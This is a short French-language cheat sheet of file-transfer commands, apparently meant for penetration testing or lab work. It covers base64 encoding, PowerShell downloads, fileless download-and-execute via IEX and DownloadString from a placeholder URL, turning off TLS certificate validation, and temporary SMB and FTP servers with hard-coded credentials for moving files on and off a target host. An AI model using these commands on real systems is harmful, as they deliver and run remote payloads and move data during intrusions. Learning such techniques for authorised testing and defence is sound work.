#### Envoie de fichier en base64

```bash
cat $fichier |base64 -w 0;echo
```

```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\$fichier", [Convert]::FromBase64String("$base64"))
```

#### Télécharger un fichier en powershell

```powershell
 
(New-Object Net.WebClient).DownloadFileAsync('$url','$nomFichier')
```

#### Télécharger un fichier en mémoire et l'exécuter (fileless)

```powershell
IEX (New-Object Net.WebClient).DownloadString('$Url_Script.ps1')

ou

(New-Object Net.WebClient).DownloadString('$Url_Script.ps1') | IEX
```

#### Télécharger un fichier via Invoke-WebRequest (ou un de ses Alias: wget, curl, iwr)

```powershell
Invoke-WebRequest $url -OutFile $nomFichier
```

#### Bypasser un certificat untrusted

```powershell
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

#### Réception d'un fichier via création d'un partage SMB

```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare -user t3st -password p4ssword
```

```powershell
net use n: \\$monip\share /user:t3st p4ssword
```

#### Réception d'un fichier via création d'un serveur FTP

```bash
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
(New-Object Net.WebClient).DownloadFile('ftp://$monIp/file.txt', 'ftp-file.txt')

Ou, en cas de shell non-interractif:

echo open $monIp > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET file.txt >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
